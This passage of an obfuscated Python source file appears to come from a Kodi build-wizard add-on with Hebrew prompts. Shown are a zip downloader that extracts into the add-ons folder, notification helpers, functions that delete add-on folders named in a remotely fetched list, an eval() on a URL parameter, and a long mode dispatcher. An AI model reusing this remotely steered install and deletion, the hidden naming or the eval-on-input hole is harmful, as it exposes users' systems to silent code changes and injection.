        OOOO000000000O0O0 =xbmcgui .DialogProgress ()#line:6470
        OOOO000000000O0O0 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6471
        O0O00OOOOOOO0OOOO =os .path .join (PACKAGES ,'isr.zip')#line:6472
        OOOO0O0OOO000OOO0 =urllib2 .Request (OOO00OOOOO0O00OOO )#line:6473
        O0O0O00O000000OOO =urllib2 .urlopen (OOOO0O0OOO000OOO0 )#line:6474
        O0O0OOO0000O0O00O =xbmcgui .DialogProgress ()#line:6476
        O0O0OOO0000O0O00O .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:6477
        O0O0OOO0000O0O00O .update (0 )#line:6478
        OOOO0000OO0OOO00O =open (O0O00OOOOOOO0OOOO ,'wb')#line:6480
        try :#line:6482
          OOOO0O00O0O00OO00 =O0O0O00O000000OOO .info ().getheader ('Content-Length').strip ()#line:6483
          OO00O0OOOO0OO00O0 =True #line:6484
        except AttributeError :#line:6485
              OO00O0OOOO0OO00O0 =False #line:6486
        if OO00O0OOOO0OO00O0 :#line:6488
              OOOO0O00O0O00OO00 =int (OOOO0O00O0O00OO00 )#line:6489
        O0OOOO0OOO0O0O0O0 =0 #line:6491
        O0OOO0O00OO0O00OO =time .time ()#line:6492
        while True :#line:6493
              O00O0OO0000O0O000 =O0O0O00O000000OOO .read (8192 )#line:6494
              if not O00O0OO0000O0O000 :#line:6495
                  sys .stdout .write ('\n')#line:6496
                  break #line:6497
              O0OOOO0OOO0O0O0O0 +=len (O00O0OO0000O0O000 )#line:6499
              OOOO0000OO0OOO00O .write (O00O0OO0000O0O000 )#line:6500
              if not OO00O0OOOO0OO00O0 :#line:6502
                  OOOO0O00O0O00OO00 =O0OOOO0OOO0O0O0O0 #line:6503
              if O0O0OOO0000O0O00O .iscanceled ():#line:6504
                 O0O0OOO0000O0O00O .close ()#line:6505
                 try :#line:6506
                  os .remove (O0O00OOOOOOO0OOOO )#line:6507
                 except :#line:6508
                  pass #line:6509
                 break #line:6510
              O00OOO000OOOOOO00 =float (O0OOOO0OOO0O0O0O0 )/OOOO0O00O0O00OO00 #line:6511
              O00OOO000OOOOOO00 =round (O00OOO000OOOOOO00 *100 ,2 )#line:6512
              O000OOOO000O0O0O0 =O0OOOO0OOO0O0O0O0 /(1024 *1024 )#line:6513
              OO00OOOO0OO00O000 =OOOO0O00O0O00OO00 /(1024 *1024 )#line:6514
              OOO0O0O0O0OO00000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000OOOO000O0O0O0 ,'teal',OO00OOOO0OO00O000 )#line:6515
              if (time .time ()-O0OOO0O00OO0O00OO )>0 :#line:6516
                OOOO00O00OOO0000O =O0OOOO0OOO0O0O0O0 /(time .time ()-O0OOO0O00OO0O00OO )#line:6517
                OOOO00O00OOO0000O =OOOO00O00OOO0000O /1024 #line:6518
              else :#line:6519
               OOOO00O00OOO0000O =0 #line:6520
              OO00O0O000OO0OOOO ='KB'#line:6521
              if OOOO00O00OOO0000O >=1024 :#line:6522
                 OOOO00O00OOO0000O =OOOO00O00OOO0000O /1024 #line:6523
                 OO00O0O000OO0OOOO ='MB'#line:6524
              if OOOO00O00OOO0000O >0 and not O00OOO000OOOOOO00 ==100 :#line:6525
                  O0O000OOOO0O0O0OO =(OOOO0O00O0O00OO00 -O0OOOO0OOO0O0O0O0 )/OOOO00O00OOO0000O #line:6526
              else :#line:6527
                  O0O000OOOO0O0O0OO =0 #line:6528
              OOOOOOO0OO00O000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00O00OOO0000O ,OO00O0O000OO0OOOO )#line:6529
              O0O0OOO0000O0O00O .update (int (O00OOO000OOOOOO00 ),OOO0O0O0O0OO00000 ,OOOOOOO0OO00O000O +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:6531
        O0000OOO0O0000000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6534
        OOOO0000OO0OOO00O .close ()#line:6537
        extract .all (O0O00OOOOOOO0OOOO ,O0000OOO0O0000000 ,O0O0OOO0000O0O00O )#line:6538
        try :#line:6542
          os .remove (O0O00OOOOOOO0OOOO )#line:6543
        except :#line:6544
          pass #line:6545
def testnotify ():#line:6548
	O0O0OOO0O0OOO0O00 =wiz .workingURL (NOTIFICATION )#line:6549
	if O0O0OOO0O0OOO0O00 ==True :#line:6550
		try :#line:6551
			OOO00O00O0O0O0000 ,O00OOO0000000O0O0 =wiz .splitNotify (NOTIFICATION )#line:6552
			if OOO00O00O0O0O0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6553
			if STARTP2 ()=='ok':#line:6554
				notify .notification (O00OOO0000000O0O0 ,True )#line:6555
		except Exception as OO0OOO0O00O00O000 :#line:6556
			wiz .log ("Error on Notifications Window: %s"%str (OO0OOO0O00O00O000 ),xbmc .LOGERROR )#line:6557
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6558
def testnotify2 ():#line:6559
	O0000000OOO0O0O00 =wiz .workingURL (NOTIFICATION2 )#line:6560
	if O0000000OOO0O0O00 ==True :#line:6561
		try :#line:6562
			O0OO00O0OOOO00OOO ,O00O0O000OOO0OOO0 =wiz .splitNotify (NOTIFICATION2 )#line:6563
			if O0OO00O0OOOO00OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6564
			if STARTP2 ()=='ok':#line:6565
				notify .notification2 (O00O0O000OOO0OOO0 ,True )#line:6566
		except Exception as O0O00OO00OOO0O0OO :#line:6567
			wiz .log ("Error on Notifications Window: %s"%str (O0O00OO00OOO0O0OO ),xbmc .LOGERROR )#line:6568
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6569
def testnotify3 ():#line:6570
	O0OOO0OOO0O000OO0 =wiz .workingURL (NOTIFICATION3 )#line:6571
	if O0OOO0OOO0O000OO0 ==True :#line:6572
		try :#line:6573
			O00O00OOOO0000O00 ,OOO0O00O0OO00O0O0 =wiz .splitNotify (NOTIFICATION3 )#line:6574
			if O00O00OOOO0000O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6575
			if STARTP2 ()=='ok':#line:6576
				notify .notification3 (OOO0O00O0OO00O0O0 ,True )#line:6577
		except Exception as O0O00O000OO000000 :#line:6578
			wiz .log ("Error on Notifications Window: %s"%str (O0O00O000OO000000 ),xbmc .LOGERROR )#line:6579
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6580
def wait ():#line:6581
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6582
def infobuild ():#line:6583
	OO0000OOO0O000O0O =wiz .workingURL (NOTIFICATION )#line:6584
	if OO0000OOO0O000O0O ==True :#line:6585
		try :#line:6586
			O0O0O00OOO0O0O0OO ,O0000O00O000O00O0 =wiz .splitNotify (NOTIFICATION )#line:6587
			if O0O0O00OOO0O0O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6588
			if STARTP2 ()=='ok':#line:6589
				notify .updateinfo (O0000O00O000O00O0 ,True )#line:6590
		except Exception as O00O000000OO0O0OO :#line:6591
			wiz .log ("Error on Notifications Window: %s"%str (O00O000000OO0O0OO ),xbmc .LOGERROR )#line:6592
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6593
def servicemanual ():#line:6594
	OO0O0OOOO0O0OOOOO =wiz .workingURL (HELPINFO )#line:6595
	if OO0O0OOOO0O0OOOOO ==True :#line:6596
		try :#line:6597
			O0000000OO00OOOO0 ,OO0O00OOOOO00O0O0 =wiz .splitNotify (HELPINFO )#line:6598
			if O0000000OO00OOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6599
			notify .helpinfo (OO0O00OOOOO00O0O0 ,True )#line:6600
		except Exception as OOO0OO000O0OO0OOO :#line:6601
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OO000O0OO0OOO ),xbmc .LOGERROR )#line:6602
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6603
def testupdate ():#line:6605
	if BUILDNAME =="":#line:6606
		notify .updateWindow ()#line:6607
	else :#line:6608
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6609
def testfirst ():#line:6611
	notify .firstRun ()#line:6612
def testfirstRun ():#line:6614
	notify .firstRunSettings ()#line:6615
def fastinstall ():#line:6618
	notify .firstRuninstall ()#line:6619
def addDir (O0000OOO00O0OO0O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6626
	O00O0OO00000O0OO0 =sys .argv [0 ]#line:6627
	if not mode ==None :O00O0OO00000O0OO0 +="?mode=%s"%urllib .quote_plus (mode )#line:6628
	if not name ==None :O00O0OO00000O0OO0 +="&name="+urllib .quote_plus (name )#line:6629
	if not url ==None :O00O0OO00000O0OO0 +="&url="+urllib .quote_plus (url )#line:6630
	OOO0OOO0O00OOOOOO =True #line:6631
	if themeit :O0000OOO00O0OO0O0 =themeit %O0000OOO00O0OO0O0 #line:6632
	OOO000O0O00OO0OO0 =xbmcgui .ListItem (O0000OOO00O0OO0O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6633
	OOO000O0O00OO0OO0 .setInfo (type ="Video",infoLabels ={"Title":O0000OOO00O0OO0O0 ,"Plot":description })#line:6634
	OOO000O0O00OO0OO0 .setProperty ("Fanart_Image",fanart )#line:6635
	if not menu ==None :OOO000O0O00OO0OO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6636
	OOO0OOO0O00OOOOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O0OO00000O0OO0 ,listitem =OOO000O0O00OO0OO0 ,isFolder =True )#line:6637
	return OOO0OOO0O00OOOOOO #line:6638
def addFile (OOOO0O00OO0O0OOOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6640
	O000O00O0O0O00OO0 =sys .argv [0 ]#line:6641
	if not mode ==None :O000O00O0O0O00OO0 +="?mode=%s"%urllib .quote_plus (mode )#line:6642
	if not name ==None :O000O00O0O0O00OO0 +="&name="+urllib .quote_plus (name )#line:6643
	if not url ==None :O000O00O0O0O00OO0 +="&url="+urllib .quote_plus (url )#line:6644
	O0O0OO0000OOO0O00 =True #line:6645
	if themeit :OOOO0O00OO0O0OOOO =themeit %OOOO0O00OO0O0OOOO #line:6646
	O00OO0O0O0OOO0OOO =xbmcgui .ListItem (OOOO0O00OO0O0OOOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6647
	O00OO0O0O0OOO0OOO .setInfo (type ="Video",infoLabels ={"Title":OOOO0O00OO0O0OOOO ,"Plot":description })#line:6648
	O00OO0O0O0OOO0OOO .setProperty ("Fanart_Image",fanart )#line:6649
	if not menu ==None :O00OO0O0O0OOO0OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:6650
	O0O0OO0000OOO0O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000O00O0O0O00OO0 ,listitem =O00OO0O0O0OOO0OOO ,isFolder =False )#line:6651
	return O0O0OO0000OOO0O00 #line:6652
def get_params ():#line:6654
	O00OO00OO0O0OO000 =[]#line:6655
	OO00000OOO0000O0O =sys .argv [2 ]#line:6656
	if len (OO00000OOO0000O0O )>=2 :#line:6657
		OOOO00O0OOOOOOOOO =sys .argv [2 ]#line:6658
		OO0OO0O0000O00O0O =OOOO00O0OOOOOOOOO .replace ('?','')#line:6659
		if (OOOO00O0OOOOOOOOO [len (OOOO00O0OOOOOOOOO )-1 ]=='/'):#line:6660
			OOOO00O0OOOOOOOOO =OOOO00O0OOOOOOOOO [0 :len (OOOO00O0OOOOOOOOO )-2 ]#line:6661
		O000O00OOO0000OO0 =OO0OO0O0000O00O0O .split ('&')#line:6662
		O00OO00OO0O0OO000 ={}#line:6663
		for O000O0O00OO0O00OO in range (len (O000O00OOO0000OO0 )):#line:6664
			OO0O00O00000OO00O ={}#line:6665
			OO0O00O00000OO00O =O000O00OOO0000OO0 [O000O0O00OO0O00OO ].split ('=')#line:6666
			if (len (OO0O00O00000OO00O ))==2 :#line:6667
				O00OO00OO0O0OO000 [OO0O00O00000OO00O [0 ]]=OO0O00O00000OO00O [1 ]#line:6668
		return O00OO00OO0O0OO000 #line:6670
def remove_addons ():#line:6672
	try :#line:6673
			import json #line:6674
			OOOOO0O0OOO0O0OO0 =urllib2 .urlopen (remove_url ).readlines ()#line:6675
			for OOO0OO00OOO0O000O in OOOOO0O0OOO0O0OO0 :#line:6676
				O0OOOO000O00O0OO0 =OOO0OO00OOO0O000O .split (':')[1 ].strip ()#line:6678
				O0OO0O0O0OOO0O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0OOOO000O00O0OO0 ,'false')#line:6679
				O00OOOOOOOO00OOO0 =xbmc .executeJSONRPC (O0OO0O0O0OOO0O000 )#line:6680
				OO00O0O00O0000000 =json .loads (O00OOOOOOOO00OOO0 )#line:6681
				O000O00O0O0OOO0O0 =os .path .join (addons_folder ,O0OOOO000O00O0OO0 )#line:6683
				if os .path .exists (O000O00O0O0OOO0O0 ):#line:6685
					for OOO00OOO0O0O00O0O ,OOOOOO0000O0000OO ,OOOO00OOOOO0OO000 in os .walk (O000O00O0O0OOO0O0 ):#line:6686
						for O0OO000OO00OOO0O0 in OOOO00OOOOO0OO000 :#line:6687
							os .unlink (os .path .join (OOO00OOO0O0O00O0O ,O0OO000OO00OOO0O0 ))#line:6688
						for OO0OO0O00O00O00O0 in OOOOOO0000O0000OO :#line:6689
							shutil .rmtree (os .path .join (OOO00OOO0O0O00O0O ,OO0OO0O00O00O00O0 ))#line:6690
					os .rmdir (O000O00O0O0OOO0O0 )#line:6691
			xbmc .executebuiltin ('Container.Refresh')#line:6693
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6694
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6695
	except :pass #line:6696
def remove_addons2 ():#line:6697
	try :#line:6698
			import json #line:6699
			OO0O0OO0O000OOO0O =urllib2 .urlopen (remove_url2 ).readlines ()#line:6700
			for OOO000000O00OO0OO in OO0O0OO0O000OOO0O :#line:6701
				O00O0O000OOOOO0OO =OOO000000O00OO0OO .split (':')[1 ].strip ()#line:6703
				OOOOOOO0OO0O000O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O00O0O000OOOOO0OO ,'false')#line:6704
				O000O0OOO00O0OO00 =xbmc .executeJSONRPC (OOOOOOO0OO0O000O0 )#line:6705
				OO0OOO0OO0000OO00 =json .loads (O000O0OOO00O0OO00 )#line:6706
				O0OO0OO0O0000O00O =os .path .join (user_folder ,O00O0O000OOOOO0OO )#line:6708
				if os .path .exists (O0OO0OO0O0000O00O ):#line:6710
					for OO00O0000O0OO000O ,O0OO00OOOO0OOO00O ,OOOO0OO000O000000 in os .walk (O0OO0OO0O0000O00O ):#line:6711
						for O0OOO00O0O0OOO000 in OOOO0OO000O000000 :#line:6712
							os .unlink (os .path .join (OO00O0000O0OO000O ,O0OOO00O0O0OOO000 ))#line:6713
						for OOO00000OO0OOO000 in O0OO00OOOO0OOO00O :#line:6714
							shutil .rmtree (os .path .join (OO00O0000O0OO000O ,OOO00000OO0OOO000 ))#line:6715
					os .rmdir (O0OO0OO0O0000O00O )#line:6716
	except :pass #line:6718
params =get_params ()#line:6719
url =None #line:6720
name =None #line:6721
mode =None #line:6722
try :mode =urllib .unquote_plus (params ["mode"])#line:6724
except :pass #line:6725
try :name =urllib .unquote_plus (params ["name"])#line:6726
except :pass #line:6727
try :url =urllib .unquote_plus (params ["url"])#line:6728
except :pass #line:6729
if not os .path .exists (os .path .join (ADDONDATA ,'4.3.0')):#line:6730
    try :#line:6731
        file =open (os .path .join (ADDONDATA ,'4.3.0'),'w')#line:6732
        file .write (str ('Done'))#line:6734
        file .close ()#line:6735
        xbmc .getInfoLabel ('System.OSVersionInfo')#line:6736
        xbmc .sleep (2000 )#line:6737
        label =xbmc .getInfoLabel ('System.OSVersionInfo')#line:6738
        ADDON .setSetting ('systemtype',label )#line:6739
    except :pass #line:6740
def setView (OOO000000O0000000 ,O00O000O0O00OOOOO ):#line:6742
	if wiz .getS ('auto-view')=='true':#line:6743
		OOO0O0OOOOOO0O000 =wiz .getS (O00O000O0O00OOOOO )#line:6744
		if OOO0O0OOOOOO0O000 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOO0O0OOOOOO0O000 ='55'#line:6745
		if OOO0O0OOOOOO0O000 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOO0O0OOOOOO0O000 ='50'#line:6746
		wiz .ebi ("Container.SetViewMode(%s)"%OOO0O0OOOOOO0O000 )#line:6747
if mode ==None :index ()#line:6749
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6751
elif mode =='builds':buildMenu ()#line:6752
elif mode =='viewbuild':viewBuild (name )#line:6753
elif mode =='buildinfo':buildInfo (name )#line:6754
elif mode =='buildpreview':buildVideo (name )#line:6755
elif mode =='install':buildWizard (name ,url )#line:6756
elif mode =='theme':buildWizard (name ,mode ,url )#line:6757
elif mode =='viewthirdparty':viewThirdList (name )#line:6758
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6759
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6760
elif mode =='maint':maintMenu (name )#line:6762
elif mode =='passpin':passandpin ()#line:6763
elif mode =='backmyupbuild':backmyupbuild ()#line:6764
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6765
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6766
elif mode =='advancedsetting':advancedWindow (name )#line:6767
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6768
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6769
elif mode =='asciicheck':wiz .asciiCheck ()#line:6770
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6771
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6772
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6773
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6774
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6775
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6776
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6777
elif mode =='currentsettings':viewAdvanced ()#line:6778
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6779
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6780
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6781
elif mode =='fixskin':backtokodi ()#line:6782
elif mode =='testcommand':testcommand ()#line:6783
elif mode =='logsend':logsend ()#line:6784
elif mode =='rdon':rdon ()#line:6785
elif mode =='rdoff':rdoff ()#line:6786
elif mode =='setrd':setrealdebrid ()#line:6787
elif mode =='setrd2':setautorealdebrid ()#line:6788
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6789
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6790
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6791
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6792
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6793
elif mode =='freshstart':freshStart ()#line:6794
elif mode =='forceupdate':wiz .forceUpdate ()#line:6795
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6796
elif mode =='forceclose':wiz .killxbmc ()#line:6797
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6798
elif mode =='hidepassword':wiz .hidePassword ()#line:6799
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6800
elif mode =='enableaddons':enableAddons ()#line:6801
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6802
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6803
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6804
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6805
elif mode =='uploadlog':uploadLog .Main ()#line:6806
elif mode =='viewlog':LogViewer ()#line:6807
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6808
elif mode =='viewerrorlog':errorChecking (all =True )#line:6809
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6810
elif mode =='purgedb':purgeDb ()#line:6811
elif mode =='fixaddonupdate':fixUpdate ()#line:6812
elif mode =='removeaddons':removeAddonMenu ()#line:6813
elif mode =='removeaddon':removeAddon (name )#line:6814
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6815
elif mode =='removedata':removeAddonData (name )#line:6816
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6817
elif mode =='systeminfo':systemInfo ()#line:6818
elif mode =='restorezip':restoreit ('build')#line:6819
elif mode =='restoregui':restoreit ('gui')#line:6820
elif mode =='restoreaddon':restoreit ('addondata')#line:6821
elif mode =='restoreextzip':restoreextit ('build')#line:6822
elif mode =='restoreextgui':restoreextit ('gui')#line:6823
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6824
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6825
elif mode =='traktsync':traktsync ()#line:6826
elif mode =='apk':apkMenu (name )#line:6828
elif mode =='apkscrape':apkScraper (name )#line:6829
elif mode =='apkinstall':apkInstaller (name ,url )#line:6830
elif mode =='speed':speedMenu ()#line:6831
elif mode =='net':net_tools ()#line:6832
elif mode =='GetList':GetList (url )#line:6833
elif mode =='youtube':youtubeMenu (name )#line:6834
elif mode =='viewVideo':playVideo (url )#line:6835
elif mode =='addons':addonMenu (name )#line:6837
elif mode =='addoninstall':addonInstaller (name ,url )#line:6838
elif mode =='savedata':saveMenu ()#line:6840
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6841
elif mode =='managedata':manageSaveData (name )#line:6842
elif mode =='whitelist':wiz .whiteList (name )#line:6843
elif mode =='trakt':traktMenu ()#line:6845
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6846
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6847
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6848
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6849
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6850
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6851
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6852
elif mode =='realdebrid':realMenu ()#line:6854
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6855
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6856
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6857
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6858
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6859
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6860
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6861
elif mode =='login':loginMenu ()#line:6863
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6864
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6865
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6866
elif mode =='clearlogin':loginit .clearSaved (name )#line:6867
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6868
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6869
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6870
elif mode =='contact':notify .contact (CONTACT )#line:6872
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6873
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6874
elif mode =='developer':developer ()#line:6876
elif mode =='converttext':wiz .convertText ()#line:6877
elif mode =='createqr':wiz .createQR ()#line:6878
elif mode =='testnotify':testnotify ()#line:6879
elif mode =='testnotify2':testnotify2 ()#line:6880
elif mode =='servicemanual':servicemanual ()#line:6881
elif mode =='fastinstall':fastinstall ()#line:6882
elif mode =='testupdate':testupdate ()#line:6883
elif mode =='testfirst':testfirst ()#line:6884
elif mode =='testfirstrun':testfirstRun ()#line:6885
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6886
elif mode =='bg':wiz .bg_install (name ,url )#line:6888
elif mode =='bgcustom':wiz .bg_custom ()#line:6889
elif mode =='bgremove':wiz .bg_remove ()#line:6890
elif mode =='bgdefault':wiz .bg_default ()#line:6891
elif mode =='rdset':rdsetup ()#line:6892
elif mode =='mor':morsetup ()#line:6893
elif mode =='mor2':morsetup2 ()#line:6894
elif mode =='firstinstall':firstinstall ()#line:6895
elif mode =='resolveurl':resolveurlsetup ()#line:6896
elif mode =='urlresolver':urlresolversetup ()#line:6897
elif mode =='forcefastupdate':forcefastupdate ()#line:6898
elif mode =='traktset':traktsetup ()#line:6899
elif mode =='placentaset':placentasetup ()#line:6900
elif mode =='flixnetset':flixnetsetup ()#line:6901
elif mode =='reptiliaset':reptiliasetup ()#line:6902
elif mode =='yodasset':yodasetup ()#line:6903
elif mode =='numbersset':numberssetup ()#line:6904
elif mode =='uranusset':uranussetup ()#line:6905
elif mode =='genesisset':genesissetup ()#line:6906
elif mode =='fastupdate':fastupdate ()#line:6907
elif mode =='folderback':folderback ()#line:6908
elif mode =='menudata':Menu ()#line:6909
elif mode =='infoupdate':infobuild ()#line:6910
elif mode =='wait':wait ()#line:6911
elif mode ==2 :#line:6912
        wiz .torent_menu ()#line:6913
elif mode ==3 :#line:6914
        wiz .popcorn_menu ()#line:6915
elif mode ==8 :#line:6916
        wiz .metaliq_fix ()#line:6917
elif mode ==9 :#line:6918
        wiz .quasar_menu ()#line:6919
elif mode ==5 :#line:6920
        swapSkins ('skin.Premium.mod')#line:6921
elif mode ==13 :#line:6922
        wiz .elementum_menu ()#line:6923
elif mode ==16 :#line:6924
        wiz .fix_wizard ()#line:6925
elif mode ==17 :#line:6926
        wiz .last_play ()#line:6927
elif mode ==18 :#line:6928
        wiz .normal_metalliq ()#line:6929
elif mode ==19 :#line:6930
        wiz .fast_metalliq ()#line:6931
elif mode ==20 :#line:6932
        wiz .fix_buffer2 ()#line:6933
elif mode ==21 :#line:6934
        wiz .fix_buffer3 ()#line:6935
elif mode ==11 :#line:6936
        wiz .fix_buffer ()#line:6937
elif mode ==15 :#line:6938
        wiz .fix_font ()#line:6939
elif mode ==14 :#line:6940
        wiz .clean_pass ()#line:6941
elif mode ==22 :#line:6942
        wiz .movie_update ()#line:6943
elif mode =='simpleiptv':#line:6946
    DIALOG =xbmcgui .Dialog ()#line:6948
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6949
    if choice ==1 :#line:6950
        iptvkodi17_18 ()#line:6951
    else :#line:6953
     sys .exit ()#line:6954
elif mode =='simpleidanplus':#line:6956
    DIALOG =xbmcgui .Dialog ()#line:6957
